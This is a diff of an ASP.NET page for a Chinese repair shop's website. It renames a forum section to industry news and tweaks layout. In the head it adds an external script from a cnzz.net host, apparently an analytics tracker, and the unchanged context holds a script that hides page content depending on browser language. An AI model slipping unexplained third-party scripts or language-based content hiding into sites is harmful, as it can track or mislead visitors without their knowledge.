@@ -4,7 +4,7 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
 <link rel="stylesheet" type="text/css" href="style.css" />
-<title>丽军数码-维修论坛</title>
+<title>丽军数码-业界新闻</title>
     <style type="text/css">
         .style2
         {
@@ -71,7 +71,7 @@ a:active {
  {border:1 solid #1C5E55; background-color:#1C5E55; color:White;  padding: 2px 6px;}
 
     </style>
-</head>
+<script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head>
   <body>
   <script language="JavaScript" type="text/javascript">
 var lang = navigator.language || navigator.userLanguage;
@@ -94,7 +94,7 @@ document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}<
     <td   align="center" valign="middle" class="topbar"><a href="show.aspx" class="ht">配件展示</a></td>
     <td  align="center" valign="middle" class="topbar"><a href="error.aspx" class="ht">常见故障</a></td>
     <td   align="center" valign="middle" class="topbar"><a href="fix.aspx" class="ht">报修流程</a></td>
-    <td  align="center" valign="middle" class="ht" bgcolor="#E96800">维修论坛</td>
+    <td  align="center" valign="middle" class="ht" bgcolor="#E96800">业界新闻</td>
     <td  align="center" valign="middle" class="topbar"><a href="shop.aspx" class="ht">网店介绍</a></td>
    <td  align="center" valign="middle" class="topbar"> <a href="staff.aspx" class="ht">人才招聘</a></td>
     <td  align="center" valign="middle" class="topbar"><a href="messages.aspx" class="ht">网上留言</a></td>
@@ -107,10 +107,10 @@ document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}<
     <td colspan="9" align="center" valign="middle" cellpadding="0">
 <table width="100%" border="0" cellspacing="0" cellpadding="12">
       <tr>
-        <td colspan="9" align="middle" valign="middle"><img src="imgs/class/img5.gif" width="200" height="194" /><div id="title" runat="server">维修论坛</div></td>
+        <td colspan="9" align="middle" valign="middle"><img src="imgs/class/img5.gif" width="200" height="194" /><div id="title" runat="server">业界新闻</div></td>
         </tr>
           <tr>
-            <td rowspan="2" align="left" valign="top" bgcolor="#FFFFFF">
+            <td rowspan="2" align="left" valign="top" bgcolor="#FFFFFF" style="width:75%;">
                 <asp:GridView ID="gvart" runat="server" AllowPaging="True" PageSize="20"
                     AutoGenerateColumns="False" CellPadding="4"  GridLines="None" 
                     Width="100%" DataSourceID="SqlDataSource1"  
@@ -152,7 +152,7 @@ document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}<
                     SelectCommand="SELECT * FROM [Article] order by [artid] desc">
                 </asp:SqlDataSource>
               </td>
-            <td align="center" style=" vertical-align:top; text-align:left;" bgcolor="#FFFFFF">
+            <td align="center" style=" vertical-align:top; text-align:left; padding:20px;" bgcolor="#FFFFFF">
           <asp:Calendar ID="Calendar1" runat="server" BackColor="White" 
                     BorderColor="#E4C25C" CellPadding="4" DayNameFormat="Shortest" 
                     Font-Names="Verdana" Font-Size="Small" ForeColor="Black" Height="180px" 
